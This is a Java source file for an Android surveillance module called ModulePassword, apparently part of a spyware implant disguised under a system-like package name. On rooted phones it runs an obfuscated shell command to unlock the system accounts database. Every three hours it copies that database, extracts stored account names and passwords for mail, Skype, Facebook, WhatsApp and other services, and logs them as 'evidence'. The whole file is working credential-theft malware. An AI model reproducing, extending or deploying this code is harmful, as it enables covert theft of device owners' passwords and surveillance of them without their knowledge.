package com.android.networking.module;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;

import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfModule;
import com.android.networking.db.GenericSqliteHelper;
import com.android.networking.evidence.EvidenceReference;
import com.android.networking.evidence.EvidenceType;
import com.android.networking.evidence.Markup;
import com.android.networking.file.Path;
import com.android.networking.util.ByteArray;
import com.android.networking.util.Check;
import com.android.networking.util.StringUtils;
import com.android.networking.util.Utils;
import com.android.networking.util.WChar;

public class ModulePassword extends BaseModule {
	private static final String TAG = "ModulePassword"; //$NON-NLS-1$
	private static final int ELEM_DELIMITER = 0xABADC0DE;
	private Markup markupPassword;
	private HashMap<String, String> lastPasswords;

	@Override
	protected boolean parse(ConfModule conf) {
		if (Status.self().haveRoot()) {
			return true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse), don't have root, bailing out");
			}
			return false;
		}
	}

	@Override
	protected void actualStart() {
		// every three hours, check.
		setPeriod(180 * 60 * 1000);
		setDelay(200);

		markupPassword = new Markup(this);
		lastPasswords = markupPassword.unserialize(new HashMap<String, String>());
	}

	@Override
	protected void actualGo() {
		//h_1=/data/system/users/0/
		//h_2=accounts.db
		String path = Messages.getString("h_1");
		String dbFile = path + Messages.getString("h_2");
		
		String localFile = Path.markup() + Messages.getString("h_2");

		if (unprotect(path) && unprotect(dbFile)) {
			try {
				Utils.copy(new File(dbFile), new File(localFile));
				dumpPasswordDb(localFile);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
		}
	}

	private void dumpPasswordDb(String dbFile) {
		GenericSqliteHelper helper = new GenericSqliteHelper(dbFile, 4);
		SQLiteDatabase db = helper.getReadableDatabase();

		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		// h_4=accounts
		queryBuilderIndex.setTables(Messages.getString("h_4"));

		// h_5=_id
		// h_6=name
		// h_7=type
		// h_8=password
		String[] projection = { Messages.getString("h_5"), Messages.getString("h_6"), Messages.getString("h_7"),
				Messages.getString("h_8") };
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);

		EvidenceReference evidence = new EvidenceReference(EvidenceType.PASSWORD);
		boolean needToSerialize = false;

		// iterate conversation indexes
		while (cursor != null && cursor.moveToNext()) {

			String jid = cursor.getString(0);
			String name = cursor.getString(1);
			String type = cursor.getString(2);
			String password = cursor.getString(3);
			String service = "service";

			String value = name +"_"+ type +"_"+ password;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpPasswordDb): id : " + jid + " name : " + name + " type: " + type + " pw: "
						+ password);
			}

			if (!StringUtils.isEmpty(password)) {

				if (lastPasswords.containsKey(jid) && lastPasswords.get(jid).equals(value)) {
					continue;
				} else {
					lastPasswords.put(jid, value);
					needToSerialize = true;
				}

				evidence.write(WChar.getBytes(type, true));
				evidence.write(WChar.getBytes(name, true));
				evidence.write(WChar.getBytes(password, true));
				evidence.write(WChar.getBytes(service, true));
				evidence.write(ByteArray.intToByteArray(ELEM_DELIMITER));
				
				createEvidenceLocal(type,name);
				
			}
		}

		if (needToSerialize) {
			markupPassword.serialize(lastPasswords);
		}
		evidence.close();

	}

	private void createEvidenceLocal(String type, String name) {
		int evId=0;
		if(type.contains("mail")) evId=0x09;
		if(type.contains("skype")) evId=0x02;
		if(type.contains("facebook")) evId=0x03;
		if(type.contains("twitter")) evId=0x04;
		if(type.contains("google")) evId=0x05;
		if(type.contains("whatsapp")) evId=0x07;
		if(type.contains("linkedin")) evId=0x0a;
	
		if(evId!=0)
			ModuleAddressBook.createEvidenceLocal(evId, name);
	}

	private boolean unprotect(String path) {
		try {
			Runtime.getRuntime().exec(Messages.getString("h_3") + path);
			return true;
		} catch (IOException e) {
			return false;
		}
	}

	@Override
	protected void actualStop() {

	}

}
